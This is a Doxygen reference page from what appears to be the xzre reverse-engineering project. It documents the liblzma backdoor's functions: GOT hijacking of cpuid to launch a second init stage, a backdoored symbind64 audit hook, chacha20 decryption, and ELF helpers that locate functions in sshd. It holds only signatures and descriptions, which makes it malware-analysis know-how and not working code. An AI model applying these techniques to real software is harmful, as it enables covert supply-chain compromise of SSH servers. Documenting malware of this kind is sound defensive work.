<p>stores <a class="el" href="structelf__entry__ctx.html#a286882a4d56155f97674460abe66b9cb" title="points to a symbol in memory will be used to find the GOT value">elf_entry_ctx_t::symbol_ptr</a> - <a class="el" href="structelf__entry__ctx.html#ab5aad4ce617c033e5e2d4740dc8551b7" title="holds the offset of the symbol relative to the GOT. used to derive the got_ptr">elf_entry_ctx_t::got_offset</a> in <a class="el" href="structelf__entry__ctx.html#a88320cc048dda10c9063bac93f76b6a0" title="points to the Global Offset Table">elf_entry_ctx_t::got_ptr</a> which is the GOT address</p>
<p>this is a modified version of __get_cpuid_max() from gcc</p>
<p><a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a> is called by replacing the _cpuid() GOT entry to point to <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a> </p><dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">cpuid_request</td><td>EAX register input. Is either 0 or 0x80000000, but this value is actually not used. </td></tr>
    <tr><td class="paramname">caller_frame</td><td>the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>unsigned int the EAX register output. Normally the maximum supported cpuid level. </dd></dl>

</div>
</div>
<a id="a247a9d52e67096a060b99f0eb6dd4ca6"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a247a9d52e67096a060b99f0eb6dd4ca6">&#9670;&nbsp;</a></span>backdoor_init()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">unsigned int backdoor_init </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>state</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64 *&#160;</td>
          <td class="paramname"><em>caller_frame</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>calls <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2</a> by disguising it as a call to cpuid. </p>
<p>this is achieved by modifying the cpuid GOT entry.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">state</td><td>the entry context, filled by <a class="el" href="xzre_8h.html#a851b6ae19abb6961d0c6c21f382e0abc">backdoor_entry</a> </td></tr>
    <tr><td class="paramname">caller_frame</td><td>the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>unsigned int the EAX register output. Normally the maximum supported cpuid level. </dd></dl>

</div>
</div>
<a id="a8ab85586c2cbdd03ee2f734b92e3e3d6"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a8ab85586c2cbdd03ee2f734b92e3e3d6">&#9670;&nbsp;</a></span>backdoor_init_stage2()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL backdoor_init_stage2 </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64 *&#160;</td>
          <td class="paramname"><em>caller_frame</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>cpuid_got_addr</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts_t</a> *&#160;</td>
          <td class="paramname"><em>reloc_consts</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ctx</td><td>holds values needed to setup the _cpuid(), passed to <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a> </td></tr>
    <tr><td class="paramname">caller_frame</td><td>stores the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver </td></tr>
    <tr><td class="paramname">cpuid_got_addr</td><td>address of the cpuid() GOT entry </td></tr>
    <tr><td class="paramname">reloc_consts</td><td>pointer to cpuid_reloc_consts </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL the value <a class="el" href="structelf__entry__ctx.html#a88320cc048dda10c9063bac93f76b6a0" title="points to the Global Offset Table">elf_entry_ctx_t::got_ptr</a> if the cpuid() GOT entry was NULL, otherwise the return value of <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a> </dd></dl>

</div>
</div>
<a id="a229ee0bd4111363061bc4230bc1f6423"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a229ee0bd4111363061bc4230bc1f6423">&#9670;&nbsp;</a></span>backdoor_setup()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL backdoor_setup </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structbackdoor__setup__params.html">backdoor_setup_params_t</a> *&#160;</td>
          <td class="paramname"><em>params</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>the backdoor main method </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">params</td><td>parameters </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL unused </dd></dl>

</div>
</div>
<a id="a60ba9b591b9f0b10a78ea2136a0a3adc"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a60ba9b591b9f0b10a78ea2136a0a3adc">&#9670;&nbsp;</a></span>backdoor_symbind64()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">uintptr_t backdoor_symbind64 </td>
          <td>(</td>
          <td class="paramtype">Elf64_Sym *&#160;</td>
          <td class="paramname"><em>sym</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int&#160;</td>
          <td class="paramname"><em>ndx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uptr *&#160;</td>
          <td class="paramname"><em>refcook</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uptr *&#160;</td>
          <td class="paramname"><em>defcook</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int&#160;</td>
          <td class="paramname"><em>flags</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">const char *&#160;</td>
          <td class="paramname"><em>symname</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>the backdoored symbind64 installed in GLRO(dl_audit) </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">sym</td><td></td></tr>
    <tr><td class="paramname">ndx</td><td></td></tr>
    <tr><td class="paramname">refcook</td><td></td></tr>
    <tr><td class="paramname">defcook</td><td></td></tr>
    <tr><td class="paramname">flags</td><td></td></tr>
    <tr><td class="paramname">symname</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>uintptr_t </dd></dl>

</div>
</div>
<a id="a8eb41e1828a73dd4ce8f82a0d42dceb5"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a8eb41e1828a73dd4ce8f82a0d42dceb5">&#9670;&nbsp;</a></span>chacha_decrypt()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL chacha_decrypt </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>in</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>inl</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>key</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>iv</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>out</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structimported__funcs.html">imported_funcs_t</a> *&#160;</td>
          <td class="paramname"><em>funcs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>decrypts a buffer with chacha20 </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">in</td><td>the input buffer to decrypt </td></tr>
    <tr><td class="paramname">inl</td><td>the length of the input buffer </td></tr>
    <tr><td class="paramname">key</td><td>the 256bit chacha key </td></tr>
    <tr><td class="paramname">iv</td><td>the 128bit chacha iv </td></tr>
    <tr><td class="paramname">out</td><td>the output buffer </td></tr>
    <tr><td class="paramname">funcs</td><td>OpenSSL imported functions </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a9ec1df74592643b26839ecbe320d36ae"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a9ec1df74592643b26839ecbe320d36ae">&#9670;&nbsp;</a></span>count_bits()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">u32 count_bits </td>
          <td>(</td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>x</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>returns the number of 1 bits in x </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">x</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>u32 number of 1 bits </dd></dl>

</div>
</div>
<a id="a2a09d15b1c506e0f29ee9433771ad8db"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a2a09d15b1c506e0f29ee9433771ad8db">&#9670;&nbsp;</a></span>elf_contains_vaddr()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL elf_contains_vaddr </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>vaddr</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>size</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u32&#160;</td>
          <td class="paramname"><em>p_flags</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>checks if given ELF file contains the range [vaddr, vaddr+size) in a segment with the specified memory protection flags </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>elf context </td></tr>
    <tr><td class="paramname">vaddr</td><td>starting memory address </td></tr>
    <tr><td class="paramname">size</td><td>memory size </td></tr>
    <tr><td class="paramname">p_flags</td><td>the expected segment protection flags (PF_*) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="aa71724f34c91861ce2211d9622e41972"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aa71724f34c91861ce2211d9622e41972">&#9670;&nbsp;</a></span>elf_find_function_pointer()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL elf_find_function_pointer </td>
          <td>(</td>
          <td class="paramtype">StringXrefId&#160;</td>
          <td class="paramname"><em>xref_id</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>pOutCodeStart</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>pOutCodeEnd</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>pOutFptrAddr</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>xrefs</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL *&#160;</td>
          <td class="paramname"><em>pCheckPrologue</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>this function searches for a function pointer, pointing to a function designated by the given <code>xref_id</code> </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">xref_id</td><td>the index to use to retrieve the function from <code>xrefs</code> </td></tr>
    <tr><td class="paramname">pOutCodeStart</td><td>output variable that will receive the function start address </td></tr>
    <tr><td class="paramname">pOutCodeEnd</td><td>output variable that will receive the function end address </td></tr>
    <tr><td class="paramname">pOutFptrAddr</td><td>output variable that will receive the address of the function pointer </td></tr>
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>sshd elf context </td></tr>
    <tr><td class="paramname">xrefs</td><td>array of resolved functions, filled by <a class="el" href="xzre_8h.html#a6925f05854b05bb9441f71c3f1deb55c">elf_find_string_references</a> </td></tr>
    <tr><td class="paramname">pCheckPrologue</td><td>if the BOOL pointed to by this variable is TRUE, an endbr64 will be expected at the beginning </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the function pointer was found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="ad86c0039d3a08468f5cf7187662ebab9"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ad86c0039d3a08468f5cf7187662ebab9">&#9670;&nbsp;</a></span>elf_find_string()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">char* elf_find_string </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">EncodedStringId *&#160;</td>
          <td class="paramname"><em>stringId_inOut</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>rodata_start_ptr</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Locates a string in the ELF .rodata section. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the ELF context to use for the search </td></tr>
    <tr><td class="paramname">stringId_inOut</td><td>mandatory pointer to an encoded string ID.<ul>
<li>if the referenced string ID is 0, the first matching string (in the string table) will stop the search, and the matching string ID will be written to the pointer.</li>
<li>if the referenced string ID is not 0, the search will look for that specific string ID, and the value will not be updated. </li>
</ul>
</td></tr>
    <tr><td class="paramname">rodata_start_ptr</td><td>location in the rodata section to start the search from </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>char* pointer to the string, or NULL if it couldn't be found </dd></dl>

</div>
</div>
<a id="a6ac7b2035eee3a9ffcceee0f9290c2e1"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a6ac7b2035eee3a9ffcceee0f9290c2e1">&#9670;&nbsp;</a></span>elf_find_string_reference()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">u8* elf_find_string_reference </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">EncodedStringId&#160;</td>
          <td class="paramname"><em>encoded_string_id</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds an instruction that references the given string </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context </td></tr>
    <tr><td class="paramname">encoded_string_id</td><td>the string to search for, in encoded form </td></tr>
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>u8* the address of the first instruction that references the given string, or NULL if not found </dd></dl>

</div>
</div>
<a id="a6925f05854b05bb9441f71c3f1deb55c"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a6925f05854b05bb9441f71c3f1deb55c">&#9670;&nbsp;</a></span>elf_find_string_references()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void elf_find_string_references </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>refs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>parses the ELF rodata section, looking for strings and the instructions that reference them </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the executable to find strings in </td></tr>
    <tr><td class="paramname">refs</td><td>structure that will be populated with the results </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL </dd></dl>

</div>
</div>
<a id="a18845fc4614f60083817db417dc32a13"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a18845fc4614f60083817db417dc32a13">&#9670;&nbsp;</a></span>elf_get_code_segment()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* elf_get_code_segment </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64 *&#160;</td>
          <td class="paramname"><em>pSize</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Obtains the address and size of the first executable segment in the given ELF file. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context, which will be updated with the address and size of the code segment </td></tr>
    <tr><td class="paramname">pSize</td><td>variable that will be populated with the page-aligned segment size </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the page-aligned starting address of the segment </dd></dl>

</div>
</div>
<a id="a52148c8b1da2a37036e7975ea299117b"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a52148c8b1da2a37036e7975ea299117b">&#9670;&nbsp;</a></span>elf_get_data_segment()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* elf_get_data_segment </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64 *&#160;</td>
          <td class="paramname"><em>pSize</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL&#160;</td>
          <td class="paramname"><em>get_alignment</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Obtains the address and size of the last read-write segment in the given ELF file this is typically the segment that contains the following sections: </p>
<ul>
<li>.init_array .fini_array .data.rel.ro .dynamic .got</li>
</ul>
<p>the parameter <code>get_alignment</code> controls if <code>pSize</code> should be populated with the segment size (when FALSE), or with the segment alignment (when TRUE)</p>
<p>Used to store data in the free space after the segment created due to alignment:</p><ul>
<li>for liblzma at (return value + 0x10) is the backdoor_hooks_data_t struct pointed to by hooks_data_addr</li>
</ul>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context, which will be updated with the address and size of the data segment </td></tr>
    <tr><td class="paramname">pSize</td><td>variable that will be populated with either the page-aligned segment size, or the alignment size </td></tr>
    <tr><td class="paramname">get_alignment</td><td>controls if alignment size should be returned instead of segment size </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the page-aligned starting address of the segment </dd></dl>

</div>
</div>
<a id="acb54dcbcba1c88075c523678a0d0dbda"></a>
<h2 class="memtitle"><span class="permalink"><a href="#acb54dcbcba1c88075c523678a0d0dbda">&#9670;&nbsp;</a></span>elf_get_got_symbol()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* elf_get_got_symbol </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">EncodedStringId&#160;</td>
          <td class="paramname"><em>encoded_string_id</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Gets the GOT symbol with name <code>encoded_string_id</code> from the parsed ELF file. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context </td></tr>
    <tr><td class="paramname">encoded_string_id</td><td>symbol to look for (encoded) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the address of the symbol, or NULL if not found </dd></dl>

</div>
</div>
<a id="acbe9201dea64d4ae8112803f8af95985"></a>
<h2 class="memtitle"><span class="permalink"><a href="#acbe9201dea64d4ae8112803f8af95985">&#9670;&nbsp;</a></span>elf_get_plt_symbol()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* elf_get_plt_symbol </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">EncodedStringId&#160;</td>
          <td class="paramname"><em>encoded_string_id</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Gets the PLT symbol with name <code>encoded_string_id</code> from the parsed ELF file. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context </td></tr>
    <tr><td class="paramname">encoded_string_id</td><td>symbol to look for (encoded) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the address of the symbol, or NULL if not found </dd></dl>

</div>
</div>
<a id="ae691cee2f2e9ea1a5861e3676fac58c0"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ae691cee2f2e9ea1a5861e3676fac58c0">&#9670;&nbsp;</a></span>elf_get_reloc_symbol()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* elf_get_reloc_symbol </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">Elf64_Rela *&#160;</td>
          <td class="paramname"><em>relocs</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>num_relocs</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>reloc_type</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">EncodedStringId&#160;</td>
          <td class="paramname"><em>encoded_string_id</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Searches the ELF relocations for a symbol having name <code>encoded_string</code> id and relocation of type <code>reloc_type</code>. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context </td></tr>
    <tr><td class="paramname">relocs</td><td>array of relocations to search in </td></tr>
    <tr><td class="paramname">num_relocs</td><td>number of items in the array pointed by <code>relocs</code> </td></tr>
    <tr><td class="paramname">reloc_type</td><td>type of relocation to consider (R_X86_64_*) </td></tr>
    <tr><td class="paramname">encoded_string_id</td><td>symbol to look for (encoded) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the address of the symbol, or NULL if not found </dd></dl>

</div>
</div>
<a id="a55e085fd878446cf655c657491b9d522"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a55e085fd878446cf655c657491b9d522">&#9670;&nbsp;</a></span>elf_get_rodata_segment()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* elf_get_rodata_segment </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64 *&#160;</td>
          <td class="paramname"><em>pSize</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Obtains the address and size of the last readonly segment in the given ELF file this corresponds to the segment that typically contains .rodata. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>the parsed ELF context, which will be updated with the address and size of the rodata segment </td></tr>
    <tr><td class="paramname">pSize</td><td>variable that will be populated with the page-aligned segment size </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the page-aligned starting address of the segment </dd></dl>

</div>
</div>
<a id="a049328971f4e99ce954d5e0346fee6d7"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a049328971f4e99ce954d5e0346fee6d7">&#9670;&nbsp;</a></span>elf_parse()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL elf_parse </td>
          <td>(</td>
          <td class="paramtype">Elf64_Ehdr *&#160;</td>
          <td class="paramname"><em>ehdr</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf_info</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Parses the given in-memory ELF file into <a class="el" href="structelf__info.html">elf_info</a>. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ehdr</td><td>pointer to the beginning of the ELF header </td></tr>
    <tr><td class="paramname"><a class="el" href="structelf__info.html">elf_info</a></td><td>pointer to the structure that will hold the parsed information </td></tr>
  </table>
  </dd>
</dl>
